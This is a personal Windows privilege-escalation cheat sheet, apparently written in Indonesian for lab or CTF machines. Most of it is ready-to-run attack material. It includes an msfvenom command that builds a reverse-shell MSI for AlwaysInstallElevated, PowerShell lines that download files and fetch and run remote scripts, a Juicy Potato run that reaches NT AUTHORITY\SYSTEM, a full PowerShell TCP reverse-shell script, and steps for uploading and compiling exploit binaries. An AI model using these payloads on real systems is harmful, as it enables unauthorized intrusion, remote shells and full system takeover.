# PrivescCheck 

dipake untuk cek privesc

    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# Always Install Elevated

https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path

allow user buat install package dengan akses system
cara cek bis apaka `PrivescCheck` kalo enabled bisa pakai msfvenom buat bikin exploit

    msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi

selanjutnya tinggal upload, listen, dan execute.

    nc -lvvp 1234

# whoami /priv

kalo SeImpersonatePrivilege enabled berarti bisa pakai lonley potato https://github.com/decoder-it/lonelypotato

enumnya bisa pakai https://github.com/rasta-mouse/Sherlock mirip linpeas

# Download file using powershell

    (new-object net.webclient).downloadfile('http://10.10.14.5/rev.bat', 'C:\users\merlin\appdata\local\temp\rev.bat')

# Download file using powershell

    powershell.exe -c "Invoke-WebRequest 10.10.14.10:80/37049-64.exe -OutFile e.exe"
    
# juicy potato


    PS C:\Users\merlin\appdata\local\temp> .\lp.exe -t * -p .\rev.bat -l 1234
    Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1234
    ....
    [+] authresult 0
    {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

    [+] CreateProcessWithTokenW OK

lp.exe download disini: https://github.com/ohpe/juicy-potato/releases
isi rev.bat:

    powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')

isi shell.ps1:

    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


# this program cannot be run in dos mode

kalo ada FTP service run, set ke bin pakai perintah:

    Connected to 10.10.10.5.
    220 Microsoft FTP Service
    Name (10.10.10.5:tripoloski): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> bin
    200 Type set to I.
    ftp> put 40564.exe
    local: 40564.exe remote: 40564.exe
    200 PORT command successful.

lalu jalankan binarnya

# COmpile x86 windows binary di linux

    i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32 